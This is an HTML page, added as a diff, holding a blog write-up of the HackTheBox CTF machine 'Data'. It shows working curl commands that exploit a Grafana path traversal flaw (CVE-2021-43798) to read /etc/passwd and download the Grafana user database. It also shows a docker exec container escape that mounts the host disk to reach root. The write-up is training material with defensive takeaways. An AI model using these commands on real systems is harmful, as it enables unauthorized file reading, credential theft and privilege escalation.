@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Data - CTF | 1xTP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Data - CTF | 1xTrashPanda</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Data - CTF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Gaining root access on Data via Grafana LFI and Docker" />
+<meta property="og:description" content="Gaining root access on Data via Grafana LFI and Docker" />
+<link rel="canonical" href="https://1xtp.github.io/writeups/Data/" />
+<meta property="og:url" content="https://1xtp.github.io/writeups/Data/" />
+<meta property="og:site_name" content="1xTrashPanda" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-09T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Data - CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-09T00:00:00-07:00","datePublished":"2026-03-09T00:00:00-07:00","description":"Gaining root access on Data via Grafana LFI and Docker","headline":"Data - CTF","mainEntityOfPage":{"@type":"WebPage","@id":"https://1xtp.github.io/writeups/Data/"},"url":"https://1xtp.github.io/writeups/Data/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="/index.html"><h2>1xTP</h2></a>
+        </div>
+        <div class="nav-right">
+            <a href="/about.html">About</a>
+            <a href="/categories.html">Categories</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <aside class="profile-card" id="profileCard">
+            <div class="sidebar-toggle" id="sidebarToggle">
+                <i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="profile-img">
+                <img src="/assets/raccoon-pfp.png" alt="1xTrashPanda" class="profile-pic">
+            </div>
+            
+            <div class="profile-info-container">
+                <div class="profile-nb-container">
+                    <div class="profile-username">
+                        <h3>1xTrashPanda</h3>
+                    </div>
+                    <p class="profile-bio">
+                        Focus: <span class="accent">Offensive Security</span><br>
+                        Specialty: <span class="accent">WebApps & AD</span>
+                    </p>
+                </div>
+
+                <div class="profile-links">
+                    <a href="https://github.com/1xTP" target="_blank">
+                        <i class="fab fa-github"></i> Github
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+        <main class="web-content-container">
+            <article class="report-body">
+
+    <section class="report-section">
+        <h2>1. Overview</h2>
+        <p>Data is an "Easy" rated Linux machine from HackTheBox that serves as a great reminder of how a single unpatched web utility can lead to a full infrastructure compromise. In this challenge, I focus on exploiting a known directory traversal vulnerability in Grafana to perform post-exploitation reconnaissance on the underlying filesystem.</p>
+        
+        <p>The path to root involves transitioning from a file read vulnerability to credential harvesting, and finally leveraging Docker group permissions to escape a containerized environment. My goal for this writeup is to document the transition from web-level access to host-level control.</p>
+    </section>
+    
+    <section class="report-section">
+        <h2>2. Recon</h2>
+        <p>Starting this machine, I ran a simple Nmap scan to see what ports were open. I like to use <code>--min-rate 5000</code> to make things go quicker.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">└─<span class="nv">$ </span>nmap <span class="nt">-sCV</span> 10.129.1.109 <span class="nt">--min-rate</span> 5000 
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 91:ef:31:0a:a5:f2:22:98:36:99:65:29:9b:0b:3e:90 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Data - Home
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+        </code></pre></figure>
+
+        <p>Port 3000 looked immediately interesting. While port 80 was just a standard landing page, port 3000 is the default home for Grafana. It's a common target, and I had a feeling the entry point would be there.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>3. Exploiting Grafana LFI</h2>
+        <p>After poking around the Grafana instance, I found it was running version 8.0.0, a version vulnerable to a Local File Inclusion (LFI). This is a classic example of why keeping internal tools patched is just as important as your public-facing web apps.</p>
+
+        <b>The Vulnerability</b>
+        <p>The specific flaw (CVE-2021-43798) allows an unauthenticated user to read arbitrary files by exploiting how Grafana handles plugin assets. I used a simple curl command to confirm I could reach the <code>/etc/passwd</code> file.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">└─<span class="nv">$ </span>curl <span class="nt">--path-as-is</span> http://10.129.1.109:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...[snip]...
+boris:x:1000:1000:boris:/home/boris:/bin/bash
+        </code></pre></figure>
+
+        <b>Hunting for the Database</b>
+        <p>Since I didn't have a password yet, I needed to find where Grafana stores its session and user data. By default, Grafana uses an SQLite database located at <code>/var/lib/grafana/grafana.db</code>. I used the LFI to download this database to my local machine for analysis.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">└─<span class="nv">$ </span>curl <span class="nt">--path-as-is</span> http://10.129.1.109:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db <span class="nt">-o</span> grafana.db
+        </code></pre></figure>
+
+        <p>After opening the database with <code>sqlite3</code>, I queried the <code>user</code> table. I found a hashed password for the user <b>boris</b>. After a quick conversion using <code>grafana2hashcat</code> I could crack the hash with Hashcat and gain valid credentials for SSH access.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>4. Escaping the Container</h2>
+        <p>Logging in as <code>boris</code>, the next step was to find a path to <code>root</code>. I usually start by checking my current user's sudo access.</p>
+
+        <b>The Discovery</b>
+        <p>Running the command <code>sudo -l</code> shows the Boris is allowed to run <code>/usr/bin/docker exec *</code> basically giving me root privileges in docker.</p>
+
+        <b>The Attack</b>
+        <p>I noticed a container already running on the system. Instead of just creating a new one, I decided to execute a shell inside the existing privileged container. By mounting the host's entire root filesystem into a directory inside the container, I could bypass the OS's file permissions entirely.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">boris@data:~<span class="nv">$ </span>docker <span class="nb">exec</span> <span class="nt">-it</span> <span class="nt">--privileged</span> <span class="nt">--user</span> root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
+root@e6ff5b1cbc85:/# mount /dev/sda1 /mnt
+root@e6ff5b1cbc85:/# <span class="nb">cat</span> /mnt/root/root.txt
+        </code></pre></figure>
+    </section>
+
+    <section class="report-section">
+        <h2>5. Conclusion</h2>
+        <p>The "Data" machine highlights a critical lesson in modern infrastructure security: <b>Internal tools are external targets.</b> While the main web server on port 80 appeared secure, an auxiliary service (Grafana) provided the entry point. </p>
+
+        <p>This CTF demonstrated the "ripple effect" of a simple LFI. What started as a simple LFI allowed me to download a database, crack a user's password, and ultimately exploit Docker's operational design to seize full control of the host. For anyone securing similar environments, the takeaway is clear: enforce the Principle of Least Privilege for service accounts and keep your container daemon access strictly limited.</p>
+    </section>
+
+    <footer class="report-footer">
+        --- [END OF PAGE] ---
+    </footer>
+</article>
+        </main>
+    </div>
+    <script>
+        const toggleBtn = document.getElementById('sidebarToggle');
+        const sidebar = document.querySelector('.profile-card');
+        const overlay = document.getElementById('mobileOverlay');
+
+        function toggleSidebar() {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        toggleBtn.addEventListener('click', toggleSidebar);
+
+        overlay.addEventListener('click', toggleSidebar);
+    </script>
+</body>
+</html>
